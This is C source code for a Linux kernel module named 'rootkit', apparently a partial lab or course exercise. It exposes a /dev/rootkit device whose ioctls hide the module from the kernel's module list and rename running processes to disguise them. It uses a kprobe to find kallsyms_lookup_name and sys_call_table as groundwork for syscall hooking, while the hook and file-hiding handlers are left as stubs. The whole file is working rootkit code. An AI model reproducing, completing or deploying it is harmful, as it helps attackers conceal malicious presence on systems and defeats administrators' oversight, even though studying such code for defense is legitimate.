#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <asm/syscall.h>
#include <linux/string.h>
#include <linux/kprobes.h>

#include "rootkit.h"

#define OURMODNAME "rootkit"

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int major;
struct cdev *kernel_cdev;
struct class *class;
struct device *device;
dev_t dev;
bool is_hidden;
struct list_head *prev;
unsigned long (*__kallsyms_lookup_name)(const char *);
unsigned long **__sys_call_table;

static int rootkit_open(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static int sanitize_req(struct masq_proc_req *req)
{

	struct masq_proc *buf;
	int i;
	int len = 0;

	buf = (struct masq_proc *)kmalloc(sizeof(struct masq_proc) * req->len, GFP_KERNEL);
	if (buf == NULL) {
		return -EFAULT;
	}

	// remove entry with strlen(new_name) > strlen(orig_name)
	for (i = 0; i < req->len; i++) {
		if (strlen(req->list[i].new_name) > strlen(req->list[i].orig_name))
			continue;
		memcpy(&buf[len++], &req->list[i], sizeof(struct masq_proc));
	}
	memcpy(req->list, buf, sizeof(struct masq_proc) * len);
	req->len = len;

	kfree(buf);
	
	return 0;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
			  unsigned long arg)
{
	long ret = 0;
	void __user *argp = (void __user *)arg;

	printk(KERN_INFO "%s\n", __func__);

	switch(ioctl) {

	case IOCTL_MOD_HOOK:
		//do something
		break;
	case IOCTL_MOD_HIDE: {

		if (is_hidden) {
			list_add(&THIS_MODULE->list, prev);
			is_hidden = false;
		} else {
			list_del_init(&THIS_MODULE->list);
			is_hidden = true;
		}
		break;
	}
	case IOCTL_MOD_MASQ: {

		struct masq_proc_req __user *user_req = argp;
		struct masq_proc_req req;
		struct masq_proc __user *user_list;
		struct task_struct *task;
		size_t i, list_size;

		if (copy_from_user(&req, user_req, sizeof(struct masq_proc_req))) {
			ret = -EFAULT;
			break;
		}
		user_list = (struct masq_proc __user *)req.list;
		if (req.len < 0) {
			ret = -EINVAL;
			break;
		}
		list_size = sizeof(struct masq_proc) * req.len;
		req.list = (struct masq_proc *)kmalloc(list_size, GFP_KERNEL);
		if (req.list == NULL) {
			ret = -EFAULT;
			break;
		}
		if (copy_from_user(req.list, user_list, list_size)) {
			ret = -EFAULT;
			goto err_free;
		}
		
		// remove entry with strlen(new_name) > strlen(orig_name)
		ret = sanitize_req(&req);
		if (ret) {
			goto err_free;
		}

		/*
		pr_err("after sanitization:\n");
		for (i = 0; i < req.len; i++) {
			pr_err("%zu:\n", i);
			pr_err("\t%s\n", req.list[i].orig_name);
			pr_err("\t%s\n", req.list[i].new_name);
		}
		*/

		for_each_process(task) {
			for (i = 0; i < req.len; i++)
				if (strncmp(req.list[i].orig_name, task->comm, sizeof(task->comm)) == 0) {
					// set_task_comm(task, req.list[i].new_name);
					// XXX: this correct?
					task_lock(task);
					strlcpy(task->comm, req.list[i].new_name, sizeof(task->comm));
					task_unlock(task);
				}
		}
err_free:
		kfree(req.list);
		break;
	}
	case IOCTL_FILE_HIDE:
		//do something
		break;

	default:
		ret = -EINVAL;
	}
	return ret;
}

struct file_operations fops = {
	open: rootkit_open,
	unlocked_ioctl: rootkit_ioctl,
	release: rootkit_release,
	owner: THIS_MODULE
};

static inline int get_kallsyms_lookup_name(void)
{
	struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name",
	};

	if (register_kprobe(&kp))
		return -1;

	__kallsyms_lookup_name = (unsigned long (*)(const char *))kp.addr;
	unregister_kprobe(&kp);

	return 0;
}

static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		goto err;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	printk("The major number for your device is %d\n", major);
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0) {
		pr_info(KERN_INFO "unable to allocate cdev");
		goto err_cdev;
	}

	// create /dev node automatically
	class = class_create(THIS_MODULE, OURMODNAME);
	if (IS_ERR(class)) {
		pr_err("class_create() failed\n");
		ret = PTR_ERR(class);
		goto err_class;
	}
	device = device_create(class, NULL, dev, NULL, OURMODNAME);
	if (IS_ERR(device)) {
		pr_err("device_create() failed\n");
		ret = PTR_ERR(device);
		goto err_device;
	}

	// for hiding module
	is_hidden = false;
	prev = THIS_MODULE->list.prev;

	// getting useful symbols
	if (get_kallsyms_lookup_name() < 0) {
		pr_err("get kallsyms_lookup_name failed\n");
		ret = -EFAULT;
		goto err_last;
	}
	__sys_call_table = (unsigned long **)(*__kallsyms_lookup_name)("sys_call_table");
	if (__sys_call_table == 0) {
		pr_err("get sys_call_table failed\n");
		ret = -EFAULT;
		goto err_last;
	}
	//pr_err("kallsyms_lookup_name: %#010lx\n", (unsigned long)__kallsyms_lookup_name);
	//pr_err("sys_call_table: %#010lx\n", (unsigned long)__sys_call_table);

	return 0;

err_last:
	device_destroy(class, dev);
err_device:
	class_destroy(class);
err_class:
	cdev_del(kernel_cdev);
err_cdev:
	unregister_chrdev_region(dev, 1);
err:
	return ret;

}

static void __exit rootkit_exit(void)
{
	// TODO: unhook syscall

	pr_info("%s: removed\n", OURMODNAME);
	cdev_del(kernel_cdev);
	// XXX: this should be major or dev?
	unregister_chrdev_region(dev, 1);

	device_destroy(class, dev);

	class_destroy(class);

}

module_init(rootkit_init);
module_exit(rootkit_exit);
